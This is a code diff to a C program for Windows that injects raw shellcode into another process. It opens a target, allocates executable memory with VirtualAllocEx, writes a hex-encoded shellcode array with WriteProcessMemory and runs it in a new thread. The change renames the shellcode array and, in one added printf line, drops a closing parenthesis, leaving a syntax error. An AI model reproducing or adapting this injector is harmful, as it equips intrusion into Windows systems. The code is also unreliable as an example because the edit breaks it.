@@ -9,7 +9,7 @@ DWORD PID, TID = NULL;
 LPVOID rBuffer = NULL;
 HANDLE hProcess = NULL, hThread = NULL;
 
-unsigned char AmongUs[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
+unsigned char Threat[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
 "\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
 "\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
@@ -69,13 +69,13 @@ int main(int argc, char* argv[]) {
 
     /*allocating bytes to memory*/
 
-    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(AmongUs), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(AmongUs));
+    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(Threat), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(Threat));
 
     /*writing to the memory that we allocated the bytes*/
 
-    WriteProcessMemory(hProcess, rBuffer, AmongUs, sizeof(AmongUs), NULL);
-    printf("%s wrote %zu-bytes to process memory.\n", k, sizeof(AmongUs));
+    WriteProcessMemory(hProcess, rBuffer, Threat, sizeof(Threat), NULL);
+    printf("%s wrote %zu-bytes to process memory.\n", k, sizeof(Threat);
     
     /*creating a threat to run the payload*/
 
@@ -102,3 +102,4 @@ int main(int argc, char* argv[]) {
     return EXIT_SUCCESS;
 
 }
+
